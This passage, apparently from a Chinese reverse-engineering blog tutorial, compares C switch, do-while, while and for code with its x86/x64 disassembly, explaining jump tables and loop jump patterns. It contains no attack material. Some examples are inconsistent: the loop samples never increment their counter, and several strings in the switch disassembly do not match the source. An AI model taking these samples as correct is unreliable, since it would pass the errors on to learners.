class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">Function</span><span class="hljs-params">(<span class="hljs-keyword">int</span> x)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">switch</span>(x)<br>    &#123;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>:<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;1&quot;</span>);<span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">2</span>:<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;2&quot;</span>);<span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">3</span>:<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;3&quot;</span>);<span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">4</span>:<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;4&quot;</span>);<span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">5</span>:<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;5&quot;</span>);<span class="hljs-keyword">break</span>;<br><br>    <span class="hljs-keyword">case</span> <span class="hljs-number">233</span>:<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;233&quot;</span>);<span class="hljs-keyword">break</span>;<br><br>    <span class="hljs-keyword">case</span> <span class="hljs-number">7</span>:<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;7&quot;</span>);<span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">8</span>:<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;8&quot;</span>);<span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">9</span>:<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;9&quot;</span>);<span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">default</span>:<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;error&quot;</span>);<span class="hljs-keyword">break</span>;<br><br>    &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    Function(<span class="hljs-number">3</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>对应的反汇编代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-number">4</span>:        <span class="hljs-keyword">switch</span>(x)<br><span class="hljs-number">5</span>:        &#123;<br><span class="hljs-number">0040</span>D898   mov         eax,dword ptr [ebp+<span class="hljs-number">8</span>]<br><span class="hljs-number">0040</span>D89B   mov         dword ptr [ebp<span class="hljs-number">-4</span>],eax<br><span class="hljs-number">0040</span>D89E   mov         ecx,dword ptr [ebp<span class="hljs-number">-4</span>]<br><span class="hljs-number">0040</span>D8A1   sub         ecx,<span class="hljs-number">1</span><br><span class="hljs-number">0040</span>D8A4   mov         dword ptr [ebp<span class="hljs-number">-4</span>],ecx<br><span class="hljs-number">0040</span>D8A7   cmp         dword ptr [ebp<span class="hljs-number">-4</span>],<span class="hljs-number">0E8</span>h<br><span class="hljs-number">0040</span>D8AE   ja          $L548+<span class="hljs-number">0F</span>h (<span class="hljs-number">0040</span>d950)<br><span class="hljs-number">0040</span>D8B4   mov         eax,dword ptr [ebp<span class="hljs-number">-4</span>]<br><span class="hljs-number">0040</span>D8B7   <span class="hljs-keyword">xor</span>         edx,edx<br><span class="hljs-number">0040</span>D8B9   mov         dl,<span class="hljs-function">byte <span class="hljs-title">ptr</span>  <span class="hljs-params">(<span class="hljs-number">0040</span>d996)</span>[eax]</span><br><span class="hljs-function">0040D8BF   jmp         dword ptr [edx*4+40D96Eh]    <span class="hljs-comment">//计算出跳转表的地址 然后 根据跳转存储的值 跳转到 case语句部分</span></span><br><span class="hljs-function">6:        <span class="hljs-keyword">case</span> 1:</span><br><span class="hljs-function">7:            <span class="hljs-title">printf</span><span class="hljs-params">(<span class="hljs-string">&quot;1&quot;</span>)</span></span>;<span class="hljs-keyword">break</span>;<br><span class="hljs-number">0040</span>D8C6   push        offset <span class="hljs-built_in">string</span> <span class="hljs-string">&quot;1&quot;</span> (<span class="hljs-number">0042203</span>c)<br><span class="hljs-number">0040</span><span class="hljs-function">D8CB   call        <span class="hljs-title">printf</span> <span class="hljs-params">(<span class="hljs-number">004011f</span>0)</span></span><br><span class="hljs-function">0040D8D0   add         esp,4</span><br><span class="hljs-function">0040D8D3   jmp         $L548+1<span class="hljs-title">Ch</span> <span class="hljs-params">(<span class="hljs-number">0040</span>d95d)</span></span><br><span class="hljs-function">8:        <span class="hljs-keyword">case</span> 2:</span><br><span class="hljs-function">9:            <span class="hljs-title">printf</span><span class="hljs-params">(<span class="hljs-string">&quot;2&quot;</span>)</span></span>;<span class="hljs-keyword">break</span>;<br><span class="hljs-number">0040</span>D8D8   push        offset <span class="hljs-built_in">string</span> <span class="hljs-string">&quot;2&quot;</span> (<span class="hljs-number">00422038</span>)<br><span class="hljs-number">0040</span><span class="hljs-function">D8DD   call        <span class="hljs-title">printf</span> <span class="hljs-params">(<span class="hljs-number">004011f</span>0)</span></span><br><span class="hljs-function">0040D8E2   add         esp,4</span><br><span class="hljs-function">0040D8E5   jmp         $L548+1<span class="hljs-title">Ch</span> <span class="hljs-params">(<span class="hljs-number">0040</span>d95d)</span></span><br><span class="hljs-function">10:       <span class="hljs-keyword">case</span> 3:</span><br><span class="hljs-function">11:           <span class="hljs-title">printf</span><span class="hljs-params">(<span class="hljs-string">&quot;3&quot;</span>)</span></span>;<span class="hljs-keyword">break</span>;<br><span class="hljs-number">0040</span>D8E7   push        offset <span class="hljs-built_in">string</span> <span class="hljs-string">&quot;3&quot;</span> (<span class="hljs-number">00422034</span>)<br><span class="hljs-number">0040</span><span class="hljs-function">D8EC   call        <span class="hljs-title">printf</span> <span class="hljs-params">(<span class="hljs-number">004011f</span>0)</span></span><br><span class="hljs-function">0040D8F1   add         esp,4</span><br><span class="hljs-function">0040D8F4   jmp         $L548+1<span class="hljs-title">Ch</span> <span class="hljs-params">(<span class="hljs-number">0040</span>d95d)</span></span><br><span class="hljs-function">12:       <span class="hljs-keyword">case</span> 4:</span><br><span class="hljs-function">13:           <span class="hljs-title">printf</span><span class="hljs-params">(<span class="hljs-string">&quot;4&quot;</span>)</span></span>;<span class="hljs-keyword">break</span>;<br><span class="hljs-number">0040</span>D8F6   push        offset <span class="hljs-built_in">string</span> <span class="hljs-string">&quot;4&quot;</span> (<span class="hljs-number">00422030</span>)<br><span class="hljs-number">0040</span><span class="hljs-function">D8FB   call        <span class="hljs-title">printf</span> <span class="hljs-params">(<span class="hljs-number">004011f</span>0)</span></span><br><span class="hljs-function">0040D900   add         esp,4</span><br><span class="hljs-function">0040D903   jmp         $L548+1<span class="hljs-title">Ch</span> <span class="hljs-params">(<span class="hljs-number">0040</span>d95d)</span></span><br><span class="hljs-function">14:       <span class="hljs-keyword">case</span> 5:</span><br><span class="hljs-function">15:           <span class="hljs-title">printf</span><span class="hljs-params">(<span class="hljs-string">&quot;5&quot;</span>)</span></span>;<span class="hljs-keyword">break</span>;<br><span class="hljs-number">0040</span>D905   push        offset <span class="hljs-built_in">string</span> <span class="hljs-string">&quot;5&quot;</span> (<span class="hljs-number">0042202</span>c)<br><span class="hljs-number">0040</span><span class="hljs-function">D90A   call        <span class="hljs-title">printf</span> <span class="hljs-params">(<span class="hljs-number">004011f</span>0)</span></span><br><span class="hljs-function">0040D90F   add         esp,4</span><br><span class="hljs-function">0040D912   jmp         $L548+1<span class="hljs-title">Ch</span> <span class="hljs-params">(<span class="hljs-number">0040</span>d95d)</span></span><br><span class="hljs-function">16:</span><br><span class="hljs-function">17:       <span class="hljs-keyword">case</span> 233:</span><br><span class="hljs-function">18:           <span class="hljs-title">printf</span><span class="hljs-params">(<span class="hljs-string">&quot;233&quot;</span>)</span></span>;<span class="hljs-keyword">break</span>;<br><span class="hljs-number">0040</span>D914   push        offset <span class="hljs-built_in">string</span> <span class="hljs-string">&quot;12&quot;</span> (<span class="hljs-number">0042201</span>c)<br><span class="hljs-number">0040</span><span class="hljs-function">D919   call        <span class="hljs-title">printf</span> <span class="hljs-params">(<span class="hljs-number">004011f</span>0)</span></span><br><span class="hljs-function">0040D91E   add         esp,4</span><br><span class="hljs-function">0040D921   jmp         $L548+1<span class="hljs-title">Ch</span> <span class="hljs-params">(<span class="hljs-number">0040</span>d95d)</span></span><br><span class="hljs-function">19:</span><br><span class="hljs-function">20:       <span class="hljs-keyword">case</span> 7:</span><br><span class="hljs-function">21:           <span class="hljs-title">printf</span><span class="hljs-params">(<span class="hljs-string">&quot;7&quot;</span>)</span></span>;<span class="hljs-keyword">break</span>;<br><span class="hljs-number">0040</span>D923   push        offset <span class="hljs-built_in">string</span> <span class="hljs-string">&quot;7&quot;</span> (<span class="hljs-number">00422028</span>)<br><span class="hljs-number">0040</span><span class="hljs-function">D928   call        <span class="hljs-title">printf</span> <span class="hljs-params">(<span class="hljs-number">004011f</span>0)</span></span><br><span class="hljs-function">0040D92D   add         esp,4</span><br><span class="hljs-function">0040D930   jmp         $L548+1<span class="hljs-title">Ch</span> <span class="hljs-params">(<span class="hljs-number">0040</span>d95d)</span></span><br><span class="hljs-function">22:       <span class="hljs-keyword">case</span> 8:</span><br><span class="hljs-function">23:           <span class="hljs-title">printf</span><span class="hljs-params">(<span class="hljs-string">&quot;8&quot;</span>)</span></span>;<span class="hljs-keyword">break</span>;<br><span class="hljs-number">0040</span>D932   push        offset <span class="hljs-built_in">string</span> <span class="hljs-string">&quot;10&quot;</span> (<span class="hljs-number">00422024</span>)<br><span class="hljs-number">0040</span><span class="hljs-function">D937   call        <span class="hljs-title">printf</span> <span class="hljs-params">(<span class="hljs-number">004011f</span>0)</span></span><br><span class="hljs-function">0040D93C   add         esp,4</span><br><span class="hljs-function">0040D93F   jmp         $L548+1<span class="hljs-title">Ch</span> <span class="hljs-params">(<span class="hljs-number">0040</span>d95d)</span></span><br><span class="hljs-function">24:       <span class="hljs-keyword">case</span> 9:</span><br><span class="hljs-function">25:           <span class="hljs-title">printf</span><span class="hljs-params">(<span class="hljs-string">&quot;9&quot;</span>)</span></span>;<span class="hljs-keyword">break</span>;<br><span class="hljs-number">0040</span>D941   push        offset <span class="hljs-built_in">string</span> <span class="hljs-string">&quot;11&quot;</span> (<span class="hljs-number">00422020</span>)<br><span class="hljs-number">0040</span><span class="hljs-function">D946   call        <span class="hljs-title">printf</span> <span class="hljs-params">(<span class="hljs-number">004011f</span>0)</span></span><br><span class="hljs-function">0040D94B   add         esp,4</span><br><span class="hljs-function">0040D94E   jmp         $L548+1<span class="hljs-title">Ch</span> <span class="hljs-params">(<span class="hljs-number">0040</span>d95d)</span></span><br><span class="hljs-function">26:       <span class="hljs-keyword">default</span>:</span><br><span class="hljs-function">27:           <span class="hljs-title">printf</span><span class="hljs-params">(<span class="hljs-string">&quot;error&quot;</span>)</span></span>;<span class="hljs-keyword">break</span>;<br><span class="hljs-number">0040</span>D950   push        offset <span class="hljs-built_in">string</span> <span class="hljs-string">&quot;error&quot;</span> (<span class="hljs-number">00422f</span>cc)<br><span class="hljs-number">0040</span><span class="hljs-function">D955   call        <span class="hljs-title">printf</span> <span class="hljs-params">(<span class="hljs-number">004011f</span>0)</span></span><br><span class="hljs-function">0040D95A   add         esp,4</span><br><span class="hljs-function">28:</span><br><span class="hljs-function">29:       &#125;</span><br><span class="hljs-function">30:   &#125;</span><br></code></pre></td></tr></table></figure><h3 id="dowhile"><a href="#dowhile" class="headerlink" title="dowhile"></a>dowhile</h3><p>特点：</p><p>​    向上跳转（分支语句都是向上跳转）</p><p>​    跳转条件不反写</p><p>​    只用一次跳转，效率最高</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span>* argv[])</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">int</span> nSum = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">do</span> <br>    &#123;<br>        nSum = nSum + i;<br>    &#125; <span class="hljs-keyword">while</span> (i &lt;=<span class="hljs-number">100</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>汇编代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs c">text:<span class="hljs-number">0000000000401550</span> ; <span class="hljs-function"><span class="hljs-keyword">int</span> __cdecl <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> **argv, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> **envp)</span></span><br><span class="hljs-function">.text:0000000000401550                 <span class="hljs-keyword">public</span> main</span><br><span class="hljs-function">.text:0000000000401550 main            proc near               </span>; CODE XREF: __tmainCRTStartup+<span class="hljs-number">242</span>↑p<br>.text:<span class="hljs-number">0000000000401550</span>                                         ; DATA XREF: .pdata:<span class="hljs-number">000000000040506</span>C↓o<br>.text:<span class="hljs-number">0000000000401550</span><br>.text:<span class="hljs-number">0000000000401550</span> var_8           = dword ptr <span class="hljs-number">-8</span><br>.text:<span class="hljs-number">0000000000401550</span> var_4           = dword ptr <span class="hljs-number">-4</span><br>.text:<span class="hljs-number">0000000000401550</span> arg_0           = dword ptr  <span class="hljs-number">10</span>h<br>.text:<span class="hljs-number">0000000000401550</span> arg_8           = qword ptr  <span class="hljs-number">18</span>h<br>.text:<span class="hljs-number">0000000000401550</span><br>.text:<span class="hljs-number">0000000000401550</span>                 push    rbp<br>.text:<span class="hljs-number">0000000000401551</span>                 mov     rbp, rsp<br>.text:<span class="hljs-number">0000000000401554</span>                 sub     rsp, <span class="hljs-number">30</span>h<br>.text:<span class="hljs-number">0000000000401558</span>                 mov     [rbp+arg_0], ecx<br>.text:<span class="hljs-number">000000000040155B</span>                 mov     [rbp+arg_8], rdx<br>.text:<span class="hljs-number">000000000040155F</span>                 call    __main       <span class="hljs-comment">//main开始</span><br>.text:<span class="hljs-number">0000000000401564</span>                 mov     [rbp+var_4], <span class="hljs-number">0</span>   <span class="hljs-comment">//a=0</span><br>.text:<span class="hljs-number">000000000040156B</span>                 mov     [rbp+var_8], <span class="hljs-number">0</span>  <span class="hljs-comment">//b=0</span><br>.text:<span class="hljs-number">0000000000401572</span><br>.text:<span class="hljs-number">0000000000401572</span> loc_401572:                             ; CODE XREF: main+<span class="hljs-number">2</span>C↓j<br>.text:<span class="hljs-number">0000000000401572</span>                 mov     eax, [rbp+var_8]  <span class="hljs-comment">//eax=b</span><br>.text:<span class="hljs-number">0000000000401575</span>                 add     [rbp+var_4], eax  <span class="hljs-comment">//a=a+b</span><br>.text:<span class="hljs-number">0000000000401578</span>                 cmp     [rbp+var_8], <span class="hljs-number">64</span>h ; <span class="hljs-string">&#x27;d&#x27;</span>  <br>.text:<span class="hljs-number">000000000040157</span>C                 jle     <span class="hljs-keyword">short</span> loc_401572     <br>.text:<span class="hljs-number">000000000040157</span>E                 mov     eax, <span class="hljs-number">0</span><br>.text:<span class="hljs-number">0000000000401583</span>                 add     rsp, <span class="hljs-number">30</span>h<br>.text:<span class="hljs-number">0000000000401587</span>                 pop     rbp<br>.text:<span class="hljs-number">0000000000401588</span>                 retn<br>.text:<span class="hljs-number">0000000000401588</span> main            endp<br></code></pre></td></tr></table></figure><h3 id="while"><a href="#while" class="headerlink" title="while"></a>while</h3><p>​    while 要先比较，再跳转，一共两次，效率较低 其中第一次跳转其地址是往增量跳转,第二次跳转其地址是往减量地址跳转</p><p>​    Release版本下</p><p>　　1.常量传播的优化方式下,其代码会变成do while执行</p><p>　　2.代码外提的情况下,其代码会变成if 包含 do while执行,其中代码的条件外提.注意,函数不可以作为代码外提</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span>* argv[])</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">int</span> nSum = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">while</span>(i &lt;= <span class="hljs-number">100</span>) <br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d&quot;</span>,nSum);<br>        nSum = nSum + i;<br>    &#125;<br>    <span class="hljs-keyword">return</span> argc;<br>&#125;<br></code></pre></td></tr></table></figure><p>对应反汇编</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs c">.text:<span class="hljs-number">0000000000401550</span> ; <span class="hljs-function"><span class="hljs-keyword">int</span> __cdecl <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> **argv, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> **envp)</span></span><br><span class="hljs-function">.text:0000000000401550                 <span class="hljs-keyword">public</span> main</span><br><span class="hljs-function">.text:0000000000401550 main            proc near               </span>; CODE XREF: __tmainCRTStartup+<span class="hljs-number">242</span>↑p<br>.text:<span class="hljs-number">0000000000401550</span>                                         ; DATA XREF: .pdata:<span class="hljs-number">000000000040506</span>C↓o<br>.text:<span class="hljs-number">0000000000401550</span><br>.text:<span class="hljs-number">0000000000401550</span> var_8           = dword ptr <span class="hljs-number">-8</span><br>.text:<span class="hljs-number">0000000000401550</span> var_4           = dword ptr <span class="hljs-number">-4</span><br>.text:<span class="hljs-number">0000000000401550</span> arg_0           = dword ptr  <span class="hljs-number">10</span>h<br>.text:<span class="hljs-number">0000000000401550</span> arg_8           = qword ptr  <span class="hljs-number">18</span>h<br>.text:<span class="hljs-number">0000000000401550</span><br>.text:<span class="hljs-number">0000000000401550</span>                 push    rbp<br>.text:<span class="hljs-number">0000000000401551</span>                 mov     rbp, rsp<br>.text:<span class="hljs-number">0000000000401554</span>                 sub     rsp, <span class="hljs-number">30</span>h<br>.text:<span class="hljs-number">0000000000401558</span>                 mov     [rbp+arg_0], ecx<br>.text:<span class="hljs-number">000000000040155B</span>                 mov     [rbp+arg_8], rdx<br>.text:<span class="hljs-number">000000000040155F</span>                 call    __main<br>.text:<span class="hljs-number">0000000000401564</span>                 mov     [rbp+var_4], <span class="hljs-number">0</span>  <span class="hljs-comment">//a=0</span><br>.text:<span class="hljs-number">000000000040156B</span>                 mov     [rbp+var_8], <span class="hljs-number">0</span>    <span class="hljs-comment">//b=0</span><br>.text:<span class="hljs-number">0000000000401572</span>                 jmp     <span class="hljs-keyword">short</span> loc_40158B<br>.text:<span class="hljs-number">0000000000401574</span> ; ---------------------------------------------------------------------------<br>.text:<span class="hljs-number">0000000000401574</span><br>.text:<span class="hljs-number">0000000000401574</span> loc_401574:                             ; CODE XREF: main+<span class="hljs-number">3F</span>↓j<br>.text:<span class="hljs-number">0000000000401574</span>                 mov     eax, [rbp+var_4]<br>.text:<span class="hljs-number">0000000000401577</span>                 mov     edx, eax<br>.text:<span class="hljs-number">0000000000401579</span>                 lea     rcx, Format     ; <span class="hljs-string">&quot;%d&quot;</span>  <span class="hljs-comment">//printf(&#x27;%d&#x27;,a);</span><br>.text:<span class="hljs-number">0000000000401580</span>                 call    <span class="hljs-built_in">printf</span>      <br>.text:<span class="hljs-number">0000000000401585</span>                 mov     eax, [rbp+var_8]   <span class="hljs-comment">//a+b</span><br>.text:<span class="hljs-number">0000000000401588</span>                 add     [rbp+var_4], eax<br>.text:<span class="hljs-number">000000000040158B</span><br>.text:<span class="hljs-number">000000000040158B</span> loc_40158B:                             ; CODE XREF: main+<span class="hljs-number">22</span>↑j<br>.text:<span class="hljs-number">000000000040158B</span>                 cmp     [rbp+var_8], <span class="hljs-number">64</span>h ; <span class="hljs-string">&#x27;d&#x27;</span>  <span class="hljs-comment">//while(b&lt;100)</span><br>.text:<span class="hljs-number">000000000040158F</span>                 jle     <span class="hljs-keyword">short</span> loc_401574   <span class="hljs-comment">//小于执行loc_401574</span><br>.text:<span class="hljs-number">0000000000401591</span>                 mov     eax, [rbp+arg_0]<br>.text:<span class="hljs-number">0000000000401594</span>                 add     rsp, <span class="hljs-number">30</span>h<br>.text:<span class="hljs-number">0000000000401598</span>                 pop     rbp<br>.text:<span class="hljs-number">0000000000401599</span>                 retn<br>.text:<span class="hljs-number">0000000000401599</span> main            endp<br></code></pre></td></tr></table></figure><h3 id="for"><a href="#for" class="headerlink" title="for"></a>for</h3><p>​    for 需要三次跳转：1赋初值后要跳过步长 2循环条件的比较 3代码块执行完要跳回到步长（for也 可以转换为do）</p><p>​    for循环因为有步长的问题,所以多一次跳转. 其中 第一步跳转到 条件位置处,第二此跳转则判断条件是否成立,不成立则退出,此时找到for的下界,当前位置可以当做if的上界.</p><p>​    条件成立之后代码继续执行,则此时又来了一次跳转,此跳转跳转到步长执行代码</p><p>Release版本下</p><p>　　1.常量传播方式下 代码变为do while执行</p><p>　　2.代码外提情况下,代码变成了 if + do while的形式　</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span>* argv[])</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">int</span> nSum = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span>(i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">100</span>;i++) <br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d&quot;</span>,nSum);<br>        nSum = nSum + i;<br>    &#125;<br>    <span class="hljs-keyword">return</span> argc;<br>&#125;<br></code></pre></td></tr></table></figure><p>对应的反汇编代码</p><h4 id="Debug"><a href="#Debug" class="headerlink" title="Debug"></a>Debug</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs c">.text:<span class="hljs-number">0000000000401550</span> ; <span class="hljs-function"><span class="hljs-keyword">int</span> __cdecl <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> **argv, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> **envp)</span></span><br><span class="hljs-function">.text:0000000000401550                 <span class="hljs-keyword">public</span> main</span><br><span class="hljs-function">.text:0000000000401550 main            proc near               </span>; CODE XREF: __tmainCRTStartup+<span class="hljs-number">242</span>↑p<br>.text:<span class="hljs-number">0000000000401550</span>                                         ; DATA XREF: .pdata:<span class="hljs-number">000000000040506</span>C↓o<br>.text:<span class="hljs-number">0000000000401550</span><br>.text:<span class="hljs-number">0000000000401550</span> var_8           = dword ptr <span class="hljs-number">-8</span><br>.text:<span class="hljs-number">0000000000401550</span> var_4           = dword ptr <span class="hljs-number">-4</span><br>.text:<span class="hljs-number">0000000000401550</span> arg_0           = dword ptr  <span class="hljs-number">10</span>h<br>.text:<span class="hljs-number">0000000000401550</span> arg_8           = qword ptr  <span class="hljs-number">18</span>h<br>.text:<span class="hljs-number">0000000000401550</span><br>.text:<span class="hljs-number">0000000000401550</span>                 push    rbp<br>.text:<span class="hljs-number">0000000000401551</span>                 mov     rbp, rsp<br>.text:<span class="hljs-number">0000000000401554</span>                 sub     rsp, <span class="hljs-number">30</span>h<br>.text:<span class="hljs-number">0000000000401558</span>                 mov     [rbp+arg_0], ecx<br>.text:<span class="hljs-number">000000000040155B</span>                 mov     [rbp+arg_8], rdx<br>.text:<span class="hljs-number">000000000040155F</span>                 call    __main<br><span class="hljs-comment">/*赋初值</span><br><span class="hljs-comment">.text:0000000000401564                 mov     [rbp+var_4], 0  